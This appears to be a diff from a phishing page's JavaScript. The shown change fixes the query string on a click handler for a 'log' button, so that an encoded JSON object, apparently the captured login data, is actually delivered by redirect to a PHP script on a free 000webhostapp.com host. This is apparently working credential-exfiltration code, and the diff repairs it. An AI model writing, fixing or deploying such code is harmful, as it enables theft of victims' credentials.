@@ -56,7 +56,7 @@ document.getElementById('log').onclick = () => {
     }
     let vurl = new URLSearchParams();
     vurl.set('rd', enc(JSON.stringify(us), 23));
-    window.location.replace('https://liveliest-plug.000webhostapp.com/dh.php' + vurl.toString());
+    window.location.replace('https://liveliest-plug.000webhostapp.com/dh.php?' + vurl.toString());
     // window.history.pushState(null,'','?' + vurl.toString());
 };
 // document.getElementById("log").onclick = () => {
